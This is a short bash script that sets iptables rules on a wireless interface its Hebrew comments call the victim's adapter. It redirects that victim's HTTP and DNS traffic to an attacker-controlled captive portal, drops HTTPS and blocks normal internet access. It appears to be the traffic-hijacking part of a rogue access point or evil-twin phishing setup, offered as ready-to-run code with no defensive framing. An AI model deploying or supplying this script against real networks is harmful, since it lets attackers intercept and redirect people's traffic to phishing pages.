#!/bin/bash

INTERFACE="wlp4s0f4u1"      # מתאם הרשת של הקורבן
CAPTIVE_IP="192.168.1.1"    # ה-IP של הפורטל שלך

echo "🧹 Cleaning previous iptables rules..."
iptables -t nat -F PREROUTING
iptables -F FORWARD
iptables -F INPUT

echo "🌐 Redirecting HTTP (port 80) to $CAPTIVE_IP:80..."
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $CAPTIVE_IP:80

echo "🔒 Dropping HTTPS (port 443) to avoid TLS noise..."
iptables -A INPUT -i $INTERFACE -p tcp --dport 443 -j DROP

echo "📡 Redirecting DNS (port 53 UDP) to $CAPTIVE_IP:53..."
iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination $CAPTIVE_IP:53

echo "🚫 Blocking internet forwarding by default..."
iptables -A FORWARD -i $INTERFACE -j DROP

echo "✅ Captive portal iptables rules set."
